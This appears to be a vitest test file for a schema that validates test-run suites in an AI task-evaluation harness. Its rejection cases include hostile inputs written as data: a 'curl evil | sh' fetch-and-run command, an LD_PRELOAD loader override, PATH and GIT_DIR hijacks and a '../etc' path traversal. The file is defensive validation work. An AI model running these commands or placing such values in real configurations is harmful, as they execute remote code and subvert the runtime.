import { describe, expect, it } from 'vitest';

import { RunConfig } from './run-config';
import { DEFAULT_SUITE, RunSuite, filesCommand, suiteCommand } from './suite';

const FASTIFY = {
  argv: [
    'node',
    '--no-use-env-proxy',
    '--test',
    'test/!(listen.5).test.js',
    'test/*/**/*.test.js',
    'test/**/*.test.mjs',
  ],
  files_argv: ['node', '--no-use-env-proxy', '--test'],
  env: { NODE_OPTIONS: '--max-old-space-size=2048' },
  deps: 'fastify',
  timeout_seconds: 300,
  test_hint: 'Run the whole suite with `node --no-use-env-proxy --test …`.',
};

const TASK = {
  id: 't001',
  title: 'A task',
  prompt: 'Do it.',
  acceptance_tests: { 'test/a.test.js': 'x' },
};

describe('the run suite', () => {
  it("defaults to the designed arena's bare node --test", () => {
    expect(DEFAULT_SUITE).toEqual({
      argv: ['node', '--test'],
      files_argv: ['node', '--test'],
      env: {},
      deps: null,
      timeout_seconds: 300,
      test_hint: 'Run `node --test`.',
    });
    expect(RunConfig.parse({ policy: 'queue', tasks: [TASK] }).suite).toEqual(DEFAULT_SUITE);
  });

  it("takes a real-task arena's argv, environment and dependency snapshot", () => {
    const suite = RunSuite.parse(FASTIFY);

    expect(suite).toEqual(FASTIFY);
    expect(suiteCommand(suite)).toBe(
      "node --no-use-env-proxy --test test/!(listen.5).test.js 'test/*/**/*.test.js' 'test/**/*.test.mjs'",
    );
    expect(filesCommand(suite, ['test/a.test.js', 'test/b.test.js'])).toBe(
      'node --no-use-env-proxy --test test/a.test.js test/b.test.js',
    );
  });

  it.each([
    ['a program other than node', { argv: ['sh', '-c', 'curl evil | sh'] }],
    ['node without --test', { argv: ['node', 'evil.js'] }],
    ['files argv without --test', { files_argv: ['node', '-e', 'x'] }],
    ['an argument with a NUL', { argv: ['node', '--test', 'a\0b'] }],
    ['an empty argument', { argv: ['node', '--test', ''] }],
    ['the runner’s PATH', { env: { PATH: '/tmp' } }],
    ['a git variable', { env: { GIT_DIR: '/x' } }],
    ['a loader variable', { env: { LD_PRELOAD: '/x.so' } }],
    ['a lower-case variable', { env: { node_options: 'x' } }],
    ['a snapshot path', { deps: '../etc' }],
    ['an unknown field', { shell: true }],
    ['a zero timeout', { timeout_seconds: 0 }],
  ])('refuses %s', (_name, fields) => {
    expect(RunSuite.safeParse({ ...FASTIFY, ...fields }).success).toBe(false);
  });

  it('is refused in a run config when it is invalid', () => {
    const parsed = RunConfig.safeParse({
      policy: 'beanstalk-v2',
      suite: { argv: ['bash', '-c', 'x'] },
      tasks: [TASK],
    });

    expect(parsed.success).toBe(false);
  });
});
